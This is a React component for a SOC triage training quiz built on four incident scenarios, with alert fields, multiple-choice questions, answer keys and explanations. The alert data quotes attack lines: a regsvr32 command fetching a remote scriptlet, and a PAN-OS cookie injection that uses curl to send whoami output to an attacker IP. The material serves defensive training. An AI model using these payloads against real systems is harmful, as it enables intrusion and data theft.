"use client";

/*
 * TriageChallenge — "you are on shift": four real alerts from the library
 * (SOC336 zero-click RCE, SOC274 PAN-OS RCE, SOC342 SharePoint ToolShell,
 * and Insider USB PII exfiltration). Switch scenarios, make the three
 * triage calls, then compare with the full investigation report.
 */

import { useEffect, useRef, useState } from "react";
import PageLink from "@/components/ui/PageLink";
import { ArrowRight, Check, RotateCcw, Siren, X } from "lucide-react";
import SectionHeader from "@/components/ui/SectionHeader";
import { KanjiWatermark } from "@/components/ui/kit";
import BilingualNote from "@/components/ui/BilingualNote";

type Q = { q: string; options: { label: string; correct?: boolean; why: string }[] };

type Scenario = {
  id: string;
  shortLabel: string;
  title: string;
  timestamp: string;
  severity: "Critical" | "High";
  caseSlug: string;
  briefAr: string;
  alert: readonly (readonly [string, string])[];
  questions: readonly Q[];
};

const SCENARIOS: readonly Scenario[] = [
  {
    id: "soc336",
    shortLabel: "01 · SOC336 OLE RCE",
    title: "SOC336 – Windows OLE Zero-Click RCE",
    timestamp: "Feb 04 2025 · 16:18",
    severity: "Critical",
    caseSlug: "soc336-report",
    briefAr: "سيناريو استغلال ثغرة CVE-2025-21298 في Outlook عبر مرفق RTF أدى لتشغيل regsvr32.exe وسحب حمولة خارجية.",
    alert: [
      ["rule", "SOC336 – Windows OLE ZeroClick RCE Exploitation Detected"],
      ["severity", "Critical (CVE-2025-21298 · CVSS 9.8)"],
      ["mail", "projectmanagement@pm.me → Austin · \"Important: Action Required…\" · mail.rtf · Allowed"],
      ["host", "Austin · 172.16.17.137"],
      ["process", "OUTLOOK.EXE → cmd.exe"],
      ["cmdline", "regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"],
      ["proxy", "GET 84.38.130.118 /shell.sct → Permitted"],
    ],
    questions: [
      {
        q: "True positive or false positive?",
        options: [
          { label: "True positive", correct: true, why: "Outlook spawning cmd.exe, regsvr32 pulling a remote scriptlet, and the proxy permitting it: the exploit ran." },
          { label: "False positive", why: "A mail client has no reason to start cmd.exe, and the download was permitted — this one is real." },
          { label: "Need more data", why: "The process tree plus the permitted download is already enough to call it." },
        ],
      },
      {
        q: "Which ATT&CK technique is the regsvr32 line?",
        options: [
          { label: "T1218.010 · Regsvr32", correct: true, why: "System Binary Proxy Execution: a signed Windows binary loads the attacker's scriptlet (\"Squiblydoo\")." },
          { label: "T1547.001 · Run keys", why: "Nothing was written for persistence here — regsvr32 is being used to execute." },
          { label: "T1110 · Brute force", why: "No credentials are being guessed in this alert." },
        ],
      },
      {
        q: "First action?",
        options: [
          { label: "Contain the host, then block the IOCs", correct: true, why: "Isolate 172.16.17.137 first, then block the IP, the sender and the RTF hash, and escalate." },
          { label: "Reset Austin's password", why: "Useful later, but the host is running attacker code right now — contain it first." },
          { label: "Close the alert and monitor", why: "Code execution is confirmed; watching is not a response." },
        ],
      },
    ],
  },
  {
    id: "soc274",
    shortLabel: "02 · SOC274 PAN-OS",
    title: "SOC274 – Palo Alto PAN-OS Command Injection",
    timestamp: "Apr 18 2024 · 15:09",
    severity: "Critical",
    caseSlug: "soc274-pdf",
    briefAr: "سيناريو استغلال ثغرة حقن الأوامر الحرجة CVE-2024-3400 في بوابة GlobalProtect على الجدار الناري PA-Firewall-01.",
    alert: [
      ["rule", "SOC274 – PAN-OS Command Injection Exploitation (CVE-2024-3400)"],
      ["severity", "Critical (CVSS 10.0)"],
      ["target", "PA-Firewall-01 · 172.16.17.139 (/global-protect/login.esp)"],
      ["source", "144.172.79.92 (Flagged by Threat Intel)"],
      ["cookie", "SESSID=../../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)`"],
      ["egress", "172.16.17.139 → 144.172.79.92:4444 at 15:09:42 · Allowed"],
    ],
    questions: [
      {
        q: "Did the command injection succeed on PA-Firewall-01?",
        options: [
          { label: "Yes — outbound callback confirmed execution", correct: true, why: "The firewall initiated an outbound connection to 144.172.79.92:4444 right after the POST request, proving the backtick curl command ran." },
          { label: "No — it was only a scanner probe", why: "A passive probe would not trigger an outbound connection from the firewall appliance to port 4444." },
          { label: "Blocked by GlobalProtect auth", why: "CVE-2024-3400 is pre-authentication in the SESSID cookie telemetry path." },
        ],
      },
      {
        q: "Which ATT&CK technique matches the initial POST to /global-protect/login.esp?",
        options: [
          { label: "T1190 · Exploit Public-Facing Application", correct: true, why: "The attacker exploited an internet-facing VPN portal vulnerability to achieve unauthenticated RCE." },
          { label: "T1566.001 · Spearphishing Attachment", why: "No email or user interaction was involved." },
          { label: "T1052.001 · Exfiltration over USB", why: "This is an edge network appliance exploit." },
        ],
      },
      {
        q: "Immediate response priority?",
        options: [
          { label: "Isolate PA-Firewall-01, block 144.172.79.92 & suspend GlobalProtect", correct: true, why: "Root compromise on a perimeter firewall risks internal pivoting; isolate/patch immediately and block the C2 IP." },
          { label: "Force password reset for domain users only", why: "The appliance OS itself is compromised as root; user password resets do not stop the shell." },
          { label: "Ignore because SESSID is a normal cookie", why: "The SESSID value contains path traversal and shell command substitution." },
        ],
      },
    ],
  },
  {
    id: "soc342",
    shortLabel: "03 · SOC342 SharePoint",
    title: "SOC342 – SharePoint ToolShell Web Shell",
    timestamp: "Jul 22 2025 · 13:07",
    severity: "Critical",
    caseSlug: "soc342-pdf",
    briefAr: "سيناريو استغلال CVE-2025-53770 (ToolShell) على خادم SharePoint وزراعة Web Shell باسم spinstall0.aspx.",
    alert: [
      ["rule", "SOC342 – CVE-2025-53770 SharePoint ToolShell Auth Bypass & RCE"],
      ["severity", "Critical"],
      ["target", "SharePoint01 · 172.16.20.17 (POST /_layouts/15/ToolPane.aspx)"],
      ["source", "107.191.58.76 · Unauthenticated · Allowed"],
      ["process", "w3wp.exe (IIS APPPOOL\\SharePoint - 80) → powershell.exe -EncodedCommand"],
      ["artifact", "C:\\Program Files\\Common Files\\...\\LAYOUTS\\spinstall0.aspx (41/60 VT)"],
      ["network", "SharePoint01 → 107.191.58.76 at 13:08:04 · Established"],
    ],
    questions: [
      {
        q: "What persistence mechanism did the attacker establish?",
        options: [
          { label: "T1505.003 · Web Shell (spinstall0.aspx)", correct: true, why: "Dropping spinstall0.aspx into the IIS LAYOUTS directory gives persistent HTTP command execution." },
          { label: "T1547.001 · Registry Run Key", why: "The persistence artifact is an ASPX web shell inside the SharePoint web root." },
          { label: "T1136 · Local Account Creation", why: "Execution ran under the IIS Application Pool identity and dropped a web shell." },
        ],
      },
      {
        q: "Why did w3wp.exe spawning encoded PowerShell confirm exploitation?",
        options: [
          { label: "IIS worker processes should not spawn interactive shells", correct: true, why: "A post to ToolPane.aspx causing w3wp.exe to launch PowerShell and write an ASPX file is classic RCE." },
          { label: "SharePoint uses PowerShell for every page view", why: "Normal page views never spawn encoded PowerShell child processes from w3wp.exe." },
          { label: "It is a routine Windows Update task", why: "Windows Update does not run from IIS APPPOOL\\SharePoint - 80." },
        ],
      },
      {
        q: "Best containment & recovery plan?",
        options: [
          { label: "Isolate SharePoint01, block 107.191.58.76, image & rebuild", correct: true, why: "With an active web shell and outbound C2, isolate the server, block the attacker IP, and capture forensic images before rebuilding." },
          { label: "Delete spinstall0.aspx only and keep the server online", why: "The vulnerability remains unpatched and in-memory/machineKey compromise may persist." },
          { label: "Block port 80 internally only", why: "The attacker already has an outbound C2 session and unpatched RCE." },
        ],
      },
    ],
  },
  {
    id: "usb-leak",
    shortLabel: "04 · Insider USB Leak",
    title: "INCD-2024-07 – Payroll PII Opened from USB",
    timestamp: "Jul 15 2024 · 03:38",
    severity: "High",
    caseSlug: "usb-forensics-report",
    briefAr: "سيناريو تحقيق جنائي رقمي في تهديد داخلي (Insider Threat) لتسريب بيانات رواتب الموظفين عبر ذاكرة USB.",
    alert: [
      ["case", "INCD-2024-07-USB-LEAK – Offline Registry & ShellBags Triage"],
      ["severity", "High (GDPR / CCPA PII Exposure)"],
      ["usbstor", "USB Device Serial 5639311262174133917 · Connected 03:36:22 UTC (Drive E:)"],
      ["shellbags", "User browsed E:\\NewProject_Hires_Data\\Payroll_NewHires\\Payroll_data1"],
      ["jumplist", "Notepad.exe opened E:\\...\\Employee_PII.csv at 03:38:07 UTC"],
      ["elapsed", "1 minute 45 seconds from USB insertion to PII file access"],
    ],
    questions: [
      {
        q: "Which Windows forensic artifact proved the user browsed the folders on Drive E:?",
        options: [
          { label: "ShellBags (USRCLASS.DAT / NTUSER.DAT)", correct: true, why: "ShellBags record folder traversal paths and timestamps even after a removable drive is disconnected." },
          { label: "DNS Cache", why: "DNS cache records domain resolutions, not local Explorer directory navigation." },
          { label: "Windows Firewall log", why: "Firewall logs network packets, not removable drive folder views." },
        ],
      },
      {
        q: "Which artifact confirmed Employee_PII.csv was actually opened in Notepad?",
        options: [
          { label: "JumpLists (AutomaticDestinations-ms)", correct: true, why: "JumpLists tie the application (Notepad) to the exact file path and timestamp (03:38:07 UTC)." },
          { label: "USBSTOR alone", why: "USBSTOR proves the hardware was plugged in, not which files were opened." },
          { label: "ARP table", why: "ARP maps IP addresses to MAC addresses on a network." },
        ],
      },
      {
        q: "Which preventive control stops unauthorized USB mass-storage exfiltration?",
        options: [
          { label: "Endpoint DLP + USB device control allow-listing by VID/PID/Serial", correct: true, why: "Blocking unknown removable storage by default and enforcing DLP policies on PII files prevents unauthorized copying." },
          { label: "Perimeter WAF rules", why: "A web application firewall cannot see physical USB ports on an endpoint." },
          { label: "SPF/DKIM email records", why: "SPF and DKIM protect email spoofing, not physical removable media." },
        ],
      },
    ],
  },
];

export default function TriageChallenge() {
  const [scenarioIdx, setScenarioIdx] = useState(0);
  const scenario = SCENARIOS[scenarioIdx] ?? SCENARIOS[0];
  const [answers, setAnswers] = useState<(number | null)[]>(scenario.questions.map(() => null));
  const [streamed, setStreamed] = useState<number>(scenario.alert.length);
  const cardRef = useRef<HTMLDivElement>(null);

  const selectScenario = (idx: number) => {
    setScenarioIdx(idx);
    const next = SCENARIOS[idx] ?? SCENARIOS[0];
    setAnswers(next.questions.map(() => null));
    setStreamed(next.alert.length);
  };

  /* Stream the alert in, line by line, when it first scrolls into view */
  useEffect(() => {
    const el = cardRef.current;
    if (!el) return;
    if (window.matchMedia("(prefers-reduced-motion: reduce)").matches || !("IntersectionObserver" in window)) {
      setStreamed(scenario.alert.length);
      return;
    }
    let timer: number | undefined;
    setStreamed(0);
    const io = new IntersectionObserver(
      ([entry]) => {
        if (!entry.isIntersecting) return;
        io.disconnect();
        let n = 0;
        const tick = () => {
          n += 1;
          setStreamed(n);
          if (n < scenario.alert.length) timer = window.setTimeout(tick, 180);
        };
        tick();
      },
      { rootMargin: "0px 0px -20% 0px" },
    );
    io.observe(el);
    return () => {
      io.disconnect();
      if (timer) window.clearTimeout(timer);
    };
  }, [scenario.alert.length]);

  const done = answers.every((a) => a !== null);
  const score = answers.filter((a, i) => a !== null && scenario.questions[i]?.options[a]?.correct).length;

  return (
    <section id="triage" aria-label="Triage challenge" className="relative py-24 md:py-32 px-6 md:px-20 bg-background overflow-hidden">
      <KanjiWatermark chars="当番" side="left" />
      <div className="max-w-7xl mx-auto relative z-10">
        <SectionHeader
          eyebrow="Your shift // Triage challenge"
          japanese="当番"
          titleA="Triage"
          titleB="This Alert."
          description="Four real incidents from the case library. Pick an alert from the queue, make the three calls an analyst makes in the first minutes, then compare with the full investigation report."
        />

        {/* Scenario Queue Selector */}
        <div className="mb-8 flex flex-wrap gap-2" role="tablist" aria-label="Select alert scenario">
          {SCENARIOS.map((sc, idx) => {
            const active = idx === scenarioIdx;
            return (
              <button
                key={sc.id}
                type="button"
                role="tab"
                aria-selected={active}
                onClick={() => selectScenario(idx)}
                className={`px-4 py-2.5 font-mono text-[0.625rem] font-bold uppercase tracking-[0.2em] border transition-all duration-300 ${
                  active
                    ? "bg-primary text-white border-primary"
                    : "bg-surface/40 text-foreground/65 border-foreground/10 hover:border-primary/40 hover:text-foreground"
                }`}
              >
                {sc.shortLabel}
              </button>
            );
          })}
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-[minmax(0,6fr)_minmax(0,5fr)] gap-8 items-start">
          {/* The alert, as a SIEM event drawer */}
          <div ref={cardRef} className="relative border border-primary/30 bg-surface/70 backdrop-blur-sm overflow-hidden">
            <div className="absolute inset-y-0 left-0 w-[3px] bg-primary" aria-hidden="true" />
            <div className="flex items-center justify-between gap-4 px-6 py-4 border-b border-foreground/10">
              <span className="flex items-center gap-3">
                <Siren size={16} className="text-primary-ink siren-pulse" aria-hidden="true" />
                <span className="font-mono text-[0.625rem] font-bold uppercase tracking-[0.3em] text-primary-ink">
                  Alert Queue · {scenario.severity}
                </span>
              </span>
              <span className="font-mono text-[0.5625rem] uppercase tracking-[0.25em] text-foreground/60">{scenario.timestamp}</span>
            </div>
            <dl className="px-6 py-5 grid gap-3 font-mono text-xs min-h-[17rem]">
              {scenario.alert.map(([k, v], i) => (
                <div
                  key={`${scenario.id}-${k}`}
                  className={`grid grid-cols-[5.5rem_1fr] gap-3 transition-all duration-500 ${i < streamed ? "opacity-100 translate-x-0" : "opacity-0 -translate-x-2"}`}
                >
                  <dt className="uppercase tracking-[0.2em] text-foreground/60 text-[0.5625rem] pt-0.5">{k}</dt>
                  <dd className={`[overflow-wrap:anywhere] ${k === "cmdline" || k === "cookie" || k === "jumplist" ? "text-accent" : k === "severity" ? "text-primary-ink font-bold" : "text-foreground/80"}`}>{v}</dd>
                </div>
              ))}
              <span className={`h-4 w-2 bg-primary/80 caret-blink ${streamed >= scenario.alert.length ? "opacity-100" : "opacity-0"}`} aria-hidden="true" />
            </dl>
            <div className="px-6 pb-5">
              <BilingualNote label="ملخص السيناريو // AR">
                {scenario.briefAr}
              </BilingualNote>
            </div>
          </div>

          {/* The decisions */}
          <div className="grid gap-6">
            {scenario.questions.map((q, qi) => {
              const picked = answers[qi];
              return (
                <fieldset key={`${scenario.id}-${q.q}`} className="border border-foreground/10 bg-surface/40 px-5 py-4">
                  <legend className="px-2 font-mono text-[0.625rem] font-bold uppercase tracking-[0.25em] text-foreground/70">
                    {String(qi + 1).padStart(2, "0")} · {q.q}
                  </legend>
                  <div className="mt-2 grid gap-2">
                    {q.options.map((o, oi) => {
                      const chosen = picked === oi;
                      const reveal = picked !== null;
                      const tone = !reveal
                        ? "border-foreground/10 hover:border-primary/50 text-foreground/80"
                        : o.correct
                          ? "border-tertiary bg-tertiary/10 text-foreground"
                          : chosen
                            ? "border-primary bg-primary/10 text-foreground answer-shake"
                            : "border-foreground/5 text-foreground/40";
                      return (
                        <button
                          key={o.label}
                          type="button"
                          disabled={reveal}
                          onClick={() => setAnswers((a) => a.map((x, i) => (i === qi ? oi : x)))}
                          className={`flex items-center justify-between gap-3 border px-4 py-2.5 text-left text-sm transition-all duration-300 disabled:cursor-default ${tone}`}
                        >
                          <span>{o.label}</span>
                          {reveal && o.correct && <Check size={14} className="text-tertiary shrink-0" aria-label="correct" />}
                          {reveal && chosen && !o.correct && <X size={14} className="text-primary-ink shrink-0" aria-label="incorrect" />}
                        </button>
                      );
                    })}
                  </div>
                  {picked !== null && (
                    <p className="mt-3 text-xs text-foreground/60 leading-relaxed answer-in" role="status">
                      {q.options[picked].why}
                    </p>
                  )}
                </fieldset>
              );
            })}

            {done && (
              <div className="flex flex-wrap items-center justify-between gap-4 border-l-2 border-accent bg-accent/5 px-5 py-4 answer-in" role="status">
                <span className="font-mono text-xs uppercase tracking-[0.2em] text-foreground">
                  Score <span className="text-accent font-black text-base tabular-nums">{score}/3</span>
                  {score === 3 ? " — ready for the queue." : " — see how it really went."}
                </span>
                <span className="flex flex-wrap gap-3">
                  <PageLink href={`/blog/${scenario.caseSlug}`} className="group inline-flex items-center gap-2 px-4 py-2.5 bg-primary text-white font-mono text-[0.625rem] font-bold uppercase tracking-[0.2em] hover:bg-foreground hover:text-background transition-colors">
                    The investigation <ArrowRight size={12} className="transition-transform duration-300 group-hover:translate-x-1" />
                  </PageLink>
                  <button
                    type="button"
                    onClick={() => setAnswers(scenario.questions.map(() => null))}
                    className="inline-flex items-center gap-2 px-4 py-2.5 border border-foreground/15 font-mono text-[0.625rem] font-bold uppercase tracking-[0.2em] text-foreground/70 hover:border-primary transition-colors"
                  >
                    <RotateCcw size={12} /> Again
                  </button>
                </span>
              </div>
            )}
          </div>
        </div>
      </div>
    </section>
  );
}
